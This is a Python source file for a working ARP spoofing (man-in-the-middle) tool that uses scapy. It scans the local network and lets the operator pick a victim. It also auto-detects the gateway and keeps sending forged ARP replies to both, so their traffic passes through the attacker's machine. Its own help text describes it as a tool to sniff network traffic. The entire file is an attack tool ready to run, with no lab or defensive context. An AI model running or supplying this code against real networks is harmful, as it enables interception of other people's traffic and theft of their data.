#!/usr/bin/python

import scapy.all as scapy
import argparse
import ipaddress
import sys
from typing import List, Dict, Tuple, Any
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Import network discovery functions
try:
    from network_scan import compute_local_ipv4_network_and_iface, detect_default_gateway_ipv4, perform_arp_scan
    from interface_list import list_npcap_devices
except ImportError as e:
    print(Fore.RED + f"[!] Import error: {e}")
    print(Fore.RED + "[!] Make sure network_scan.py and interface_list.py are in the same directory.")
    sys.exit(1)

class ArpSpoofer:
    def __init__(self, target_ip, spoof_ip, interface):
        #  Constructor for ArpSpoofer class. Initializes target, spoof IP addresses, and network interface.
        self.target_ip = target_ip
        self.spoof_ip = spoof_ip
        self.interface = interface

    def get_mac(self, ip):
        # Sends an ARP request to retrieve the MAC address of the specified IP
        request = scapy.ARP(pdst=ip)
        broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
        final_packet = broadcast / request
        answer = scapy.srp(final_packet, iface=self.interface, timeout=2, verbose=False)[0]
        mac = answer[0][1].hwsrc
        return mac

    def spoof(self, target, spoofed):
        # Spoofs the target machine by pretending to be the spoofed IP address.
        mac = self.get_mac(target)
        packet = scapy.ARP(op=2, hwdst=mac, pdst=target, psrc=spoofed)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.YELLOW + f"[+] Spoofing {target} pretending to be {spoofed}")

    def restore(self, dest_ip, source_ip):
        # Restores the ARP table of the target to its original state.
        dest_mac = self.get_mac(dest_ip)
        source_mac = self.get_mac(source_ip)
        packet = scapy.ARP(op=2, pdst=dest_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=source_mac)
        scapy.send(packet, iface=self.interface, verbose=False)
        print(Fore.GREEN + f"[+] Restoring {dest_ip} to its original state.")

    def run(self):
        # Starts the ARP spoofing attack by continuously sending spoofed packets.
        # Restores ARP tables upon interruption (CTRL+C).
        try:
            while True:
                self.spoof(self.target_ip, self.spoof_ip)  # Spoof the target IP
                self.spoof(self.spoof_ip, self.target_ip)  # Spoof the spoofed IP
        except KeyboardInterrupt:
            print(Fore.RED + "[!] Detected CTRL+C. Restoring ARP tables... Please wait.")
            self.restore(self.target_ip, self.spoof_ip)
            self.restore(self.spoof_ip, self.target_ip)
            print(Fore.GREEN + "[+] ARP tables restored.")

if __name__ == "__main__":
    # Setting up argparse for command-line arguments
    parser = argparse.ArgumentParser(description="ARP Spoofing Tool to sniff network traffic.")
    parser.add_argument("-t", "--target", help="Target IP address to spoof.")
    parser.add_argument("-s", "--spoof", help="Spoofed IP address (e.g., the gateway IP).")
    parser.add_argument("-i", "--interface", help="Network interface to use (e.g., eth0, wlan0).")
    
    # Automatic discovery options
    parser.add_argument("-a", "--auto", action="store_true", help="Enable automatic mode (auto-detect interface, scan for targets, and detect gateway)")
    parser.add_argument("--auto-interface", action="store_true", help="Automatically detect network interface")
    parser.add_argument("--auto-target", action="store_true", help="Automatically scan for and select target")
    parser.add_argument("--auto-gateway", action="store_true", help="Automatically detect gateway IP")
    parser.add_argument("--scan-only", action="store_true", help="Only scan the network and list discovered devices, then exit")

    # Parse the arguments
    args = parser.parse_args()
    
    # If scan-only mode is enabled, just scan and exit
    if args.scan_only:
        try:
            interface_name, network = compute_local_ipv4_network_and_iface()
            gateway_ip = detect_default_gateway_ipv4()
            
            print(Fore.CYAN + f"[i] Active interface: {interface_name}")
            print(Fore.CYAN + f"[i] Scanning network: {network}")
            if gateway_ip:
                print(Fore.CYAN + f"[i] Default gateway: {gateway_ip}")
            
            results = perform_arp_scan(interface_name, network)
            if not results:
                print(Fore.RED + "[!] No active hosts discovered.")
                print(Fore.YELLOW + "[i] This could be due to:")
                print(Fore.YELLOW + "    - No other devices are active on the network")
                print(Fore.YELLOW + "    - Insufficient permissions (try running as Administrator)")
                print(Fore.YELLOW + "    - Npcap not installed (required for Windows)")
                print(Fore.YELLOW + "    - Incorrect interface selection")
                print(Fore.YELLOW + "    - Network configuration issues")
                print(Fore.YELLOW + "")
                print(Fore.YELLOW + "[i] Troubleshooting tips:")
                print(Fore.YELLOW + "    1. Ensure you're running this script as Administrator")
                print(Fore.YELLOW + "    2. Install Npcap from https://nmap.org/npcap/")
                print(Fore.YELLOW + "    3. Check your network interface selection")
                print(Fore.YELLOW + "    4. Verify network connectivity with 'ping' command")
                sys.exit(1)
                
            print(Fore.GREEN + f"[+] Discovered {len(results)} device(s):")
            for i, entry in enumerate(results):
                marker = " (gateway)" if gateway_ip and entry['ip'] == gateway_ip else ""
                print(f"  {i+1}. {entry['ip']:15}  {entry['mac']}{marker}")
            sys.exit(0)
        except PermissionError as e:
            print(Fore.RED + f"[!] Permission error during network scan: {e}")
            print(Fore.YELLOW + "[i] Try running this script as Administrator.")
            print(Fore.YELLOW + "[i] Also ensure Npcap is installed on Windows systems.")
            sys.exit(1)
        except Exception as e:
            print(Fore.RED + f"[!] Error during network scan: {e}")
            sys.exit(1)
    
    # Handle automatic discovery
    target_ip = args.target
    spoof_ip = args.spoof
    interface = args.interface
    
    if args.auto or args.auto_interface:
        try:
            interface, _ = compute_local_ipv4_network_and_iface()
            print(Fore.CYAN + f"[i] Auto-detected interface: {interface}")
        except Exception as e:
            print(Fore.RED + f"[!] Error detecting interface: {e}")
            # Fallback to listing interfaces
            npcap_devices = list_npcap_devices()
            if npcap_devices:
                print(Fore.YELLOW + "[!] Available interfaces:")
                for i, name in enumerate(npcap_devices):
                    print(f"  {i+1}. {name}")
                try:
                    choice = int(input(Fore.CYAN + "[?] Select interface (number): "))
                    interface = npcap_devices[choice-1]
                except (ValueError, IndexError):
                    print(Fore.RED + "[!] Invalid choice. Exiting.")
                    sys.exit(1)
            else:
                print(Fore.RED + "[!] No interfaces found. Exiting.")
                sys.exit(1)
    
    if args.auto or args.auto_target:
        if not interface:
            print(Fore.RED + "[!] Interface is required for network scanning.")
            sys.exit(1)
            
        try:
            _, network = compute_local_ipv4_network_and_iface()
            results = perform_arp_scan(interface, network)
            if not results:
                print(Fore.RED + "[!] No active hosts discovered.")
                print(Fore.YELLOW + "[i] This could be due to:")
                print(Fore.YELLOW + "    - No other devices are active on the network")
                print(Fore.YELLOW + "    - Insufficient permissions (try running as Administrator)")
                print(Fore.YELLOW + "    - Npcap not installed (required for Windows)")
                sys.exit(1)
                
            print(Fore.GREEN + f"[+] Discovered {len(results)} device(s):")
            for i, entry in enumerate(results):
                print(f"  {i+1}. {entry['ip']:15}  {entry['mac']}")
                
            try:
                choice = int(input(Fore.CYAN + "[?] Select target (number): "))
                target_ip = results[choice-1]['ip']
                print(Fore.CYAN + f"[i] Selected target: {target_ip}")
            except (ValueError, IndexError):
                print(Fore.RED + "[!] Invalid choice. Exiting.")
                sys.exit(1)
        except PermissionError as e:
            print(Fore.RED + f"[!] Permission error during target discovery: {e}")
            print(Fore.YELLOW + "[i] Try running this script as Administrator.")
            print(Fore.YELLOW + "[i] Also ensure Npcap is installed on Windows systems.")
            sys.exit(1)
        except Exception as e:
            print(Fore.RED + f"[!] Error during target discovery: {e}")
            sys.exit(1)
    
    if args.auto or args.auto_gateway:
        try:
            spoof_ip = detect_default_gateway_ipv4()
            if spoof_ip:
                print(Fore.CYAN + f"[i] Auto-detected gateway: {spoof_ip}")
            else:
                print(Fore.RED + "[!] Could not detect gateway automatically.")
                spoof_ip = input(Fore.CYAN + "[?] Enter gateway IP manually: ")
        except Exception as e:
            print(Fore.RED + f"[!] Error detecting gateway: {e}")
            spoof_ip = input(Fore.CYAN + "[?] Enter gateway IP manually: ")
    
    # Validate required parameters
    if not target_ip:
        target_ip = input(Fore.CYAN + "[?] Enter target IP: ")
    
    if not spoof_ip:
        spoof_ip = input(Fore.CYAN + "[?] Enter spoof IP (gateway): ")
    
    if not interface:
        interface = input(Fore.CYAN + "[?] Enter interface: ")
    
    # Create an ArpSpoofer object and start the spoofing process
    spoofer = ArpSpoofer(target_ip=target_ip, spoof_ip=spoof_ip, interface=interface)
    spoofer.run()
